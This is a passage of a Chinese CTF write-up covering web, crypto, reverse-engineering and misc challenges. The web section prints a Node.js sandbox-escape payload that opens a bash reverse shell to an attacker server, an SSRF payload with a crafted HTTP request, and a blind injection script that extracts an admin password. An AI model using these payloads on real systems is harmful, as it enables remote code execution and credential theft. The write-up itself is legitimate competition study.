+<p><code>c='constructor';this[c][c](&quot;c='constructor';require=this[c][c]('return     process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'],); console.log(ls.output.toString());&quot;)()</code></p>
+<p>将 payload 里面的 ip 和 port 替换成我们 服务器 的 ip 和端口。有了 payload，我们要想办法让题目访问我们的恶意页面。看一下源码。</p>
+<p>在 user.js 下</p>
+<figure data-type="image" tabindex="29"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/42d0a51a57f7d.png" alt="5" loading="lazy"></figure>
+<p>看到访问/user/bucket 似乎会自动访问我们个人信息里设置的 bucket，尝试访问</p>
+<figure data-type="image" tabindex="30"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/2c1000dbefb4c.png" alt="6" loading="lazy"></figure>
+<p>尝试更改 bucket 设置，先看源码</p>
+<figure data-type="image" tabindex="31"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/ad0daf1a5e4ae.png" alt="7" loading="lazy"></figure>
+<p>在 checkBucket 函数下，看到 bucket 的要求，必须以 http:或者 https:为开头，且必须包含 oss-cn-beijing.ichunqiu.com，我们尝试修改前面为自己的 服务器 地址</p>
+<figure data-type="image" tabindex="32"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/c9a5082d26324.png" alt="8" loading="lazy"></figure>
+<p>点击更新</p>
+<figure data-type="image" tabindex="33"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/9debc7b4fd5d9.png" alt="9" loading="lazy"></figure>
+<p>变回原来的了，并且提示 admin 会来检查，但在源码里看到</p>
+<figure data-type="image" tabindex="34"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/469fd73c91b1f.png" alt="10" loading="lazy"></figure>
+<p>这里其实算是更改失败了，admin 不会去检查</p>
+<p>源码里有个重定向到 /user/verify?token=${authToken}，我们尝试用队伍token</p>
+<figure data-type="image" tabindex="35"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/6a8e8766714c8.png" alt="11" loading="lazy"></figure>
+<p>浏览器 url 输入队伍 token</p>
+<figure data-type="image" tabindex="36"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/d813789549f5d.png" alt="12" loading="lazy"></figure>
+<p>修改 bucket，但不要点击 update，直接在访问我们放入队伍 token 后的 url</p>
+<figure data-type="image" tabindex="37"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/aee9df1567cd2.png" alt="13" loading="lazy"></figure>
+<p>提示更改成功 看到我们的 bucket 也被设置成了我们的 服务器 地址</p>
+<figure data-type="image" tabindex="38"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/437cf814234ac.png" alt="14" loading="lazy"></figure>
+<p>再访问/user/bucket</p>
+<figure data-type="image" tabindex="39"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/4ad6d574eabfd.png" alt="15" loading="lazy"></figure>
+<p>回显的内容变了，报错 404，这是因为我的 服务器 上没有 oss-cn-beijing.ichunqiu.com 这个文件。</p>
+<p>到这里思路就很清晰了，我们在 服务器 上放置一个 oss-cn-beijing.ichunqiu.com.html 恶意文件，然后修改 bucket 为 http://公网 ip 地址/oss-cn-beijing.ichunqiu.com.html</p>
+<p>并且这个 html 文件已经被我们插入了用<code>&lt;script&gt;</code>标签包裹的恶意 payload</p>
+<figure data-type="image" tabindex="40"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/7f5d2ada78c05.png" alt="16" loading="lazy"></figure>
+<p><code>c='constructor';this[c][c](&quot;c='constructor';require=this[c][c]('return 	process')().mainModule.require;var sync=require('child_process').spawnSync; var ls= sync('bash', ['-c','bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'],); console.log(ls.output.toString());&quot;)() </code></p>
+<p>这里将 payload 的 ip 和 port 修改为 服务器 的即可我们先用刚刚的方法修改 bucket</p>
+<figure data-type="image" tabindex="41"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/44b81db6b0337.png" alt="17" loading="lazy"></figure>
+<p>修改成功</p>
+<figure data-type="image" tabindex="42"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/e1062b3e5feca.png" alt="18" loading="lazy"></figure>
+<figure data-type="image" tabindex="43"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/315396fab501d.png" alt="19" loading="lazy"></figure>
+<p>服务器开始监听</p>
+<p>题目内访问/user/bucket</p>
+<figure data-type="image" tabindex="44"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/a2901184710e2.png" alt="20" loading="lazy"></figure>
+<p>成功反弹 shell</p>
+<figure data-type="image" tabindex="45"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/6ba6a02b32153.png" alt="21" loading="lazy"></figure>
+<p>在根目录看到一个假 flag 文件和一个 readflag 文件，cd 到跟目录 执行 ./readflag 拿到 flag</p>
+<p>Flag: flag{4ff69fdb-57ea-4b3b-95aa-2ecb86e7207f}</p>
+<h2 id="web5-secrets_of_admin">web5 Secrets_Of_Admin</h2>
+<p>进去就是一个登陆框，源码给了用户名、密码，直接登就行</p>
+<figure data-type="image" tabindex="46"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/fee1030e15409.png" alt="1629868096446.png" loading="lazy"></figure>
+<p>进去之后随便输点东西，会显示</p>
+<figure data-type="image" tabindex="47"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/485b693d2761c.png" alt="1629868119372.png" loading="lazy"></figure>
+<p>可以猜测 pdf 就是输进去内容的显示，那么难点就是怎么得到这个 pdf 文件名  源码里提到了关于 filename 的东西：</p>
+<figure data-type="image" tabindex="48"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/9a136078fc1bb.png" alt="1629868139447.png" loading="lazy"></figure>
+<p>不幸的是，这个 filename 完全是随机的，所以根本拿不到这个 pdf  继续往下看源码，这儿给了注释</p>
+<figure data-type="image" tabindex="49"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/449c66b7995d2.png" alt="1629868158427.png" loading="lazy"></figure>
+<p>显然就是要我们通过 add file 的方式去下载这个 pdf 了</p>
+<pre><code class="language-php">if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {     return next(createError(401)); 
+} 
+</code></pre>
+<p>这串代码会直接获取真实的请求 ip 地址，同时也指明了一条解题方向--SSRF  不过翻了半天，没找到啥注入姿势，然后又去看源码，这一处给了提示</p>
+<figure data-type="image" tabindex="50"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/005039217f646.png" alt="1629868208100.png" loading="lazy"></figure>
+<p>过滤掉了 &lt;&gt;/script ，要明白，出题人不会无缘无故过滤东西的，肯定是有危险才会进行过滤，那  思路就可以围绕这个过滤展开了  看到上面过滤的内容，会想到 html 标签，xss 等，但我们的思路又是 SSRF，猜测是在 Content 处用 html 的标签来进行</p>
+<p>SSRF，接着尝试了各种编码，转义，发现都会被过滤.....，然后又去谷歌上搜了下 js 绕过 includes，在这篇文章里找到了解决方案：</p>
+<p><code>https://bycsec.top/2020/04/20/Nodejs</code> 的一些技巧/</p>
+<figure data-type="image" tabindex="51"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/f4f2f05dca778.png" alt="1629868269731.png" loading="lazy"></figure>
+<p>它是用数组来绕的，试下</p>
+<figure data-type="image" tabindex="52"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/fb2687e30a3df.png" alt="1629868293436.png" loading="lazy"></figure>
+<p>ok 啦，成功绕过</p>
+<p>现在绕过之后就是构造 SSRF 了，由于我们的 username、filename、checknum 都可控</p>
+<figure data-type="image" tabindex="53"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/13f160e0dbd1b.png" alt="1629868313449.png" loading="lazy"></figure>
+<p>并且会经过 DB.getFile</p>
+<figure data-type="image" tabindex="54"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/67ef695f9c219.png" alt="1629868334441.png" loading="lazy"></figure>
+<p>跟进 getFile</p>
+<figure data-type="image" tabindex="55"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/2472aed4f7fbd.png" alt="1629868355185.png" loading="lazy"></figure>
+<p>显然，可以通过控制 username、filename 和 checksum 这三个参数去查询数据库里的信息  不过还有要注意的是这儿进行了目录穿越，所以我们构造的 filename 也需要进行目录穿越：</p>
+<figure data-type="image" tabindex="56"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/542e4d1bd5776.png" alt="1629868377837.png" loading="lazy"></figure>
+<p><strong>payload：</strong></p>
+<p><code>content[]=&lt;img%20src=&quot;http://127.0.0.1:8888/api/files?username=admin%26filename=../files/ flag%26checksum=pulse&quot;&gt; </code></p>
+<p>构造数据包：</p>
+<pre><code>POST /admin HTTP/1.1 
+Host: eci-2zehr586mkdtfhoxt0zx.cloudeci1.ichunqiu.com:8888 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
+Accept-Encoding: gzip, deflate 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 114 
+Origin: http://eci-2zehr586mkdtfhoxt0zx.cloudeci1.ichunqiu.com:8888 
+Connection: close 
+Referer: http://eci-2zehr586mkdtfhoxt0zx.cloudeci1.ichunqiu.com:8888/admin 
+Cookie: 	__jsluid_h=6ccf55deec8f56ff3faf481076e7830b; token=s%3Aj%3A%7B%22username%22%3A%22admin%22%2C%22files%22%3A%5B%5D%2C%22isAdmin%22%3Atrue%7D. F56WSi1msokS7QwqhYWcJm%2FBhe1UiZ%2FxOtKnM%2BaehVU 
+Upgrade-Insecure-Requests: 1 
+ 
+content[]=&lt;img%20src=&quot;http://127.0.0.1:8888/api/files?username=admin%26filename=../files/ flag%26checksum=pulse&quot;&gt;
+</code></pre>
+<p>send，然后访问/api/files/pulse，即可下载到 pdf，打开就是 flag</p>
+<figure data-type="image" tabindex="57"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/103f00c836501.png" alt="1629868483133.png" loading="lazy"></figure>
+<p>Flag: flag{3dd18f2d-a482-4913-8acd-0b7d50427b52]</p>
+<h2 id="web6-packagemanager2021">web6 PackageManager2021</h2>
+<p>非预期可能，sql 注入出 admin 密码。正常应该是 xss 打 cookie。这里是一个 node 的 sql 注入注入点在/auth</p>
+<figure data-type="image" tabindex="58"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/5f259775e8cd8.png" alt="1629869082085.png" loading="lazy"></figure>
+<p>通过不同的回显，编写 sql 注入脚本：</p>
+<pre><code class="language-python">import requests reasult = &quot;&quot; 
+url = &quot;http://47.104.108.80:8888/auth&quot; 
+cookies={&quot;session&quot;:&quot;s%3AE7uKKlTHygc_GmDhclfNVgaZCRR1vkE.6YLuz1yrpGf7BwLeHdL9qyor9zZqqrLuvf ZZNsRQpT4&quot;} 
+for x in range(0,30): 
+for y in range(30,130): 
+data={&quot;_csrf&quot;:&quot;j69ZLz2C9vQRYABBPybMFsqn501VkIz9eT8&quot;,&quot;token&quot;:'aaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaa&quot; 	|| 	(this.username 	== 	&quot;admin&quot;&amp;&amp;this.password[{}] 	== 	&quot;{}&quot;) 	|| 	this.username 	== 
+&quot;test'.format(x,chr(y))} 
+        response = requests.post(url,cookies=cookies, data=data)         if &quot;No matching results&quot; in response.text: 
+            reasult += chr(y)             print reasult 
+            break
+</code></pre>
+<p>运行脚本，跑出来 admin 用户的密码是 b!@#$d5dh47jyfz#098crw*w</p>
+<figure data-type="image" tabindex="59"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/f9ff03509cb2e.png" alt="1629869143785.png" loading="lazy"></figure>
+<p>访问<code>http://47.104.108.80:8888/login</code>使用账户 admin，密码 b!@#$d5dh47jyfz#098crw*w 登录即可获取 flag 为 flag{407bb420-7845-4722-a322-f3f11b5bf09f}</p>
+<p>虽然这里 flag 显示不完全，但是可以直接复制即可获取完整 flag</p>
+<figure data-type="image" tabindex="60"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/67d6a9f18ab18.png" alt="1629869182447.png" loading="lazy"></figure>
+<h1 id="crypto">Crypto</h1>
+<h2 id="crypto4-random_rsa">crypto4 Random_RSA</h2>
+<p>观察代码中给出的参数，很容易想到是 dp 泄露问题，所以我们只需要反算出 dp 的值就行，先反算得到 rands 的值</p>
+<pre><code class="language-python">import random import binascii import os 
+len_dp = 154 
+ 
+seeds = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 
+8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 
+1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 
+925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579] res = [] for i in range(0, len_dp): random.seed(seeds[i]) 
+rands = [] for j in range(0,4): 
+rands.append(random.randint(0,255)) res.append(rands) 
+# 	res.append(ord(dp[i]) ^ rands[i%4]) 
+# 	del rands[i%4] # 	print(str(rands)) 
+print(res)
+</code></pre>
+<p>接着用得到的 rands 值算出 dp，再将 dp 带入，算出 flag</p>
+<pre><code class="language-python">import gmpy2 import binascii def getd(n,e,dp): for i in range(1,e): if (dp*e-1)%i == 0: if n%(((dp*e-1)/i)+1)==0: 
+p=((dp*e-1)/i)+1 q=n/(((dp*e-1)/i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi return d 
+dp=53720074261611961544056405041107366591901831940529667230760412666108931586780 92845450232508793279585163304918807656946147575280063208168816457346755227057 n=811962829926061135912336152046805976452085622793278540269813769179778436448551 80528227037752692498558370026353244981467900057157997462760732019372185955846507 
+97745665776012568212510430924180210885361846849146332626801645011981718136874337 
+6919334016359137566652069490881871670703767378496685419790016705210391 
+ 
+e=0x10001 
+c=615052562239933495344745508777876755008273328789416212614778608806897999609382 02020614342208518869582019307850789493701589309453566095881294166336673487909221 
+86064180962252481395928472228506975531089097225554543698908265470509890700669478 
+0949725756312169019688455553997031840488852954588581160550377081811151 d=getd(n,e,dp)
+m=pow(c,d,n) 
+print(binascii.unhexlify(hex(m)[2:]))
+</code></pre>
+<figure data-type="image" tabindex="61"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/e6acbd767ef30.png" alt="1629869309787.png" loading="lazy"></figure>
+<p>Flag: flag{74281db3-c6f0-e59a-4da6-39b8c71250fe}</p>
+<h1 id="reverse">reverse</h1>
+<h2 id="re1-勒索解密">re1 勒索解密</h2>
+<p>根据标题和提示可以知道，这个 exe 应该和文件加密有关，所以我们首先要分析他如何对文件加密的，这样才能进行解密。首先先将软件丢入 IDA，进入口函数直接 F5，看看能看出点啥</p>
+<figure data-type="image" tabindex="62"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/15c8e989bd40a.png" alt="1629870035298.png" loading="lazy"></figure>
+<p>这里可以猜出来，与 bmp 文件加解密可能相关，然后，就看不懂了，果断拖入 OD，结合动调分析</p>
+<figure data-type="image" tabindex="63"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/508dd0fd4f01d.png" alt="1629870066866.png" loading="lazy"></figure>
+<p>我们不妨猜想，他是对这个目录所有 bmp 图片进行加密，然后我根据这个目录，随便写了一个文件，运行程序后，发现生成了一个加密文件，猜想成立！</p>
+<figure data-type="image" tabindex="64"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/271926425e68e.png" alt="1629870106662.png" loading="lazy"></figure>
+<p>在回到 IDA，往下翻，我们可以看到如下，发现运用的是 csp 容器加密</p>
+<figure data-type="image" tabindex="65"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/6113f33ba7373.png" alt="1629870148916.png" loading="lazy"></figure>
+<p>用 OD 确认了下，写出的文件，和 csp 加密的结果是基本一致(除了多出来了 136 个字节)，说明确实是 csp 加密，我们就朝着这个方向研究</p>
+<figure data-type="image" tabindex="66"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/8cdfd7e783164.png" alt="1629870169288.png" loading="lazy"></figure>
+<p>连接 CSP</p>
+<figure data-type="image" tabindex="67"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/79ae226d033cd.png" alt="1629870187578.png" loading="lazy"></figure>
+<p>根据 phProv 定位到了这个函数，往下翻，找加密相关</p>
+<figure data-type="image" tabindex="68"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/f9d94e7a13679.png" alt="1629870206407.png" loading="lazy"></figure>
+<p>这里有点要注意，pbData 的数据，和加密时间戳有关，说明加密结果会随时间变化而变化，当然写出时间段肯定大于加密时间段，所以记住这个时间戳，等会我们写脚本遍历</p>
+<figure data-type="image" tabindex="69"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/edf39fe4e0afb.png" alt="1629870231427.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="70"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/1d794b0e192eb.png" alt="1629870245413.png" loading="lazy"></figure>
+<p>点进这个函数</p>
+<figure data-type="image" tabindex="71"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/003d9040fb99a.png" alt="1629870267890.png" loading="lazy"></figure>
+<p>还有几个函数我没去分析，我是直接根据 OD 动调判断出是无用函数(或许是我太菜了，没看出来用处。。。) 然后写脚本，即可跑出那张图片脚本语言:易语言</p>
+<p>模块引用:精益模块(百度就能找到吧)</p>
+<p>脚本下载地址:https://share.weiyun.com/tmLoFT0Y</p>
+<figure data-type="image" tabindex="72"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/c238a7b5d8292.png" alt="1629870306089.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="73"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/3edd63b978c43.png" alt="1629870319439.png" loading="lazy"></figure>
+<p>Flag: ctf{2724EE54-9114-4C1E-AC86-3C9B5B6B4C7B}</p>
+<h2 id="re3-rev_dizzy">re3 Rev_Dizzy</h2>
+<p>首先配置下 IDA 文件的这个</p>
+<figure data-type="image" tabindex="74"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/47b2abfeecd3e.png" alt="1629869815494.png" loading="lazy"></figure>
+<p>然后进去直接 F5 反编译，会看到一大堆简单的 +-^运算，留下加密部分，大概 5000 行代码</p>
+<figure data-type="image" tabindex="75"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/d88057a9af845.png" alt="1629869841874.png" loading="lazy"></figure>
+<p>上面是我复制出来的算法。。。。</p>
+<p>咋一看很吓人，但是转过来想想，他只有单调的+-^,所以只要倒过来进行逆运算，即可得到结果,脚本如下...易模块引用:精益模块.ec 百度即可下载</p>
+<figure data-type="image" tabindex="76"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/d811d2af9a907.png" alt="1629869866284.png" loading="lazy"></figure>
+<pre><code class="language-易语言">.版本 2 
+.支持库 spec 
+ 
+.程序集 窗口程序集_启动窗口 
+.程序集变量 cal, 文本型, , &quot;5000&quot; 
+.程序集变量 arr, 字节型, , &quot;32&quot; 
+ 
+.子程序 __启动窗口_创建完毕 
+.局部变量 left 
+.局部变量 right 
+.局部变量 op, 文本型 
+.局部变量 i 
+.局部变量 index 
+ 
+cal ＝ 分割文本 (到文本 (读入文件 (“D:\cal.txt”)), #换行符, ) 
+arr ＝ { 39, 60, 227, 252, 46, 65, 7, 94, 98, 207, 232, 242, 146, 128, 226, 54, 180, 178, 103, 119, 15, 246, 13, 182, 237, 28, 101, 138, 7, 83, 166, 102 } 
+.计次循环首 (5000, i)     index ＝ 5001 － i 
+    op ＝ 文本_取出中间文本 (cal [index], “] ”, “=”, , 真) 
+    left ＝ 到整数 (文本_取出中间文本 (cal [index], “  a[”, “]”, , 真)) 
+    .如果 (取文本右边 (cal [index], 2) ＝ “];”) 
+        right ＝ 到整数 (文本_取出中间文本 (cal [index], “= a[”, “];”, , 真))         right ＝ arr [right ＋ 1] 
+    .否则 
+        right ＝ 到整数 (文本_取出中间文本 (cal [index], “=”, “;”, , 真)) 
+    .如果结束 
+    .如果 (op ＝ “+”) 
+        arr [left ＋ 1] ＝ arr [left ＋ 1] － right 
+ 
+    .否则 
+        .如果 (op ＝ “-”) 
+            arr [left ＋ 1] ＝ arr [left ＋ 1] ＋ right 
+        .否则 
+            .如果 (op ＝ “^”) 
+                arr [left ＋ 1] ＝ 位异或 (arr [left ＋ 1], right) 
+            .否则 
+                调试输出 (op ＋ “Error”) 
+            .如果结束 
+ 
+        .如果结束 
+ 
+    .如果结束 
+ 
+.计次循环尾 ()
+调试输出 (到文本 (arr)) 
+</code></pre>
+<p>Flag: flag{Try_R3vers1ng_W1th_ScR!pt!}</p>
+<h2 id="re4-rev_apc">re4 Rev_APC</h2>
+<p>提取出这里使用异或解密得到的 dll：</p>
+<figure data-type="image" tabindex="77"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/8e209eae6f89c.png" alt="1629869575421.png" loading="lazy"></figure>
+<p>来到 dll 中关键函数：</p>
+<figure data-type="image" tabindex="78"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/94923549d11af.png" alt="1629869605081.png" loading="lazy"></figure>
+<p>开始使用了一个 hash 算法对 AkiraDDL 加密得到一个 32 位的 hash 值，这里其实并不需要关心，因为加密的时候并没有使用。下面是与驱动文件交互的用例：</p>
+<figure data-type="image" tabindex="79"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/78251ae13e2aa.png" alt="1629869664368.png" loading="lazy"></figure>
+<p>再一个注意的是那个用来和明文加密的数据，使用 NtRequestWaitReplyPort 请求进行了变化。</p>
+<p>一个累异或：</p>
+<pre><code class="language-c">if ( a2 &gt; 0 )
+  {
+    v4 = 0i64;
+    v5 = (unsigned int)a2;
+    v6 = a1 - a3;
+    do
+    {
+      v7 = 0i64;
+      v8 = (_BYTE *)(v4 + a3);
+      for ( i = *(_BYTE *)(v6 + v4 + a3); v7 &lt; v4; ++v7 )
+        i ^= *(_BYTE *)(v7 + a1);
+      ++v4;
+      *v8 = i;
+      --v5;
+    }
+    while ( v5 );
+  }
+</code></pre>
+<p>然后是没有使用 srand，随机数是默认的种子，也就是固定的。 <strong>exp：</strong></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+unsigned char hash[] = {165, 106, 167, 113, 180, 119, 198, 3, 209, 8, 223, 24, 206, 3, 215, 15, 204, 119, 186, 98, 174, 109, 221, 24, 192, 9, 213, 213, 213, 213, 213, 213};
+unsigned char hashed[32][32] = {0};
+char order[] = {0, 5, 5, 2, 2, 3, 4, 4, 3, 2, 0, 3, 0, 3, 2, 1, 5, 1, 3, 1, 5, 5, 2, 4, 0, 0, 4, 5, 4, 4, 5, 5};
+unsigned char enc[32] = {87, 197, 56, 27, 58, 168, 52, 47, 57, 151, 198, 228, 4, 47, 143, 238, 94, 81, 128, 103, 36, 201, 111, 72, 91, 127, 189, 199, 176, 194, 194, 235};
+
+unsigned char plain[32] = {0};
+
+unsigned char fun(unsigned char a)
+{
+	return ((a&lt;&lt;4)|(a&gt;&gt;4));
+}
+
+void fun1(unsigned char *a, unsigned char *b)
+{
+	for(int i = 0; i &lt; 32; i++)
+	{
+		a[i] += 16;
+		b[i] ^= a[i];
+	}
+}
+
+void fun2(unsigned char *a, unsigned char *b)
+{
+	for(int i = 0; i &lt; 32; i++)
+	{
+		a[i] -= 80;
+		b[i] ^= fun(a[i]);
+	}
+}
+
+void fun3(unsigned char *a, unsigned char *b)
+{
+	for(int i = 0; i &lt; 32; i++)
+	{
+		b[i] ^= a[i];
+	}
+}
+
+void fun4(unsigned char *a, unsigned char *b)
+{
+	for(int i = 0; i &lt; 32; i++)
+	{
+		a[i] -= 80;
+	}
+	
+	for(int i = 0; i &lt; 32; i += 2)
+	{
+		b[i] ^= 16*a[i];
+		b[i+1] ^= a[i] &gt;&gt; 4;
+	}
+	
+}
+
+void fun5(unsigned char *a, unsigned char *b)
+{
+	for(int i = 0; i &lt; 32; i++)
+	{
+		b[i] ^= a[i];
+	}
+	
+}
+
+void fun6(unsigned char *a, unsigned char *b)
+{
+	
+	for(int i = 0; i &lt; 32; i++)
+	{
+		if((unsigned char)(a[i]-33) &gt; 46)
+		{
+			if((unsigned char)(a[i]-81) &gt; 46)
+			{
+				if(a[i]&gt;0x80)
+				{
+					a[i] = a[i]-48;
+					b[i] -= a[i];
+				}
+			}
+			else
+			{
+				a[i] = a[i]-48;
+				b[i] ^= a[i] &gt;&gt; 4;
+			}
+		}
+		else
+		{
+			a[i] = a[i]-80;
+			b[i] += a[i];
+		}
+	}
+}
+
+void defun6(unsigned char *a, unsigned char *b)
+{
+	for(int i = 0; i &lt; 32; i++)
+	{
+		if((unsigned char)(a[i]-33) &gt; 46)
+		{
+			if((unsigned char)(a[i]-81) &gt; 46)
+			{
+				if(a[i]&gt;0x80)
+				{
+					a[i] = a[i]-48;
+					b[i] += a[i];
+				}
+			}
+			else
+			{
+				a[i] = a[i]-48;
+				b[i] ^= a[i] &gt;&gt; 4;
+			}
+		}
+		else
+		{
+			a[i] = a[i]-80;
+			b[i] -= a[i];
+		}
+	}
+}
+
+int main(void)
+{
+	for(int i = 0; i &lt; 32; i++)
+	{
+		unsigned char tmp = 0;
+		for(int j = 0; j &lt; i+1; j++)
+			tmp ^= hash[j];
+	} 
+	
+	for(int i = 0; i &lt; 32; i++)
+	{
+		for(int j = 0; j &lt; 32; j++)
+		{
+			hashed[i][j] = hash[j];
+			//printf(&quot;%d, &quot;, hash[j]);
+		}
+		//putchar(10);
+		switch(rand()%6)
+		{
+			case 0: fun1(hash, plain);
+				break;
+			case 1: fun2(hash, plain);
+				break;
+			case 2: fun3(hash, plain);
+				break;
+			case 3: fun4(hash, plain);
+				break;
+			case 4: fun5(hash, plain);
+				break;
+			case 5: fun6(hash, plain);
+				break;
+		}
+	
+	}
+	
+	for(int i = 0; i &lt; 32; i++)
+	{
+		switch(order[i])
+		{
+			case 0: fun1(hashed[31-i], enc);
+				break;
+			case 1: fun2(hashed[31-i], enc);
+				break;
+			case 2: fun3(hashed[31-i], enc);
+				break;
+			case 3: fun4(hashed[31-i], enc);
+				break;
+			case 4: fun5(hashed[31-i], enc);
+				break;
+			case 5: defun6(hashed[31-i], enc);
+				break;
+		}
+	
+	}
+
+	
+	for(int i = 0; i &lt; 32; i++)
+	{
+		printf(&quot;%c&quot;, enc[i]);
+	}
+		
+	return 0;
+}
+</code></pre>
+<p>最后运行 exp，成功拿到 flag{Kmode_Umode_Communication!}</p>
+<figure data-type="image" tabindex="80"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/ff701cdebdc24.png" alt="1629869768578.png" loading="lazy"></figure>
+<h1 id="misc">misc</h1>
+<h2 id="misc1-chieftainssecret">misc1 ChieftainsSecret</h2>
+<p>下载附件，得到 csv 文件和电路图。</p>
+<p>电路图上有两个元件，STM32 为常用的开发板，用其接收另一个元件的信号。另一个元件经搜索得知为角度传感器。在官网找到其DataSheet-v01_00-EN.pdf?fileId=5546d46264a8de7e0164eca986da1a32</p>
+<p>阅读技术文档后得知csv中四列数据的含义：PC0连接到SIN_P，代表角度的正正弦值sin(α)；PC1连接到SIN_N，代表角度的负正弦值 sin(-α)；PC2 和 PC3 为余弦值。</p>
+<p>只需要一组正弦和余弦就可以计算角度，多余的一组是用于减少误差的。这里用正值。 原始读数为模拟量，需要进行标准化处理。用下面的脚本把数据处理为振幅为  1 且居中的数据：</p>
+<pre><code class="language-python">import csv 
+import math 
+import numpy as np
+import matplotlib.pyplot as plt 
+ 
+SIN_P = [] 
+SIN_N = [] 
+COS_P = [] 
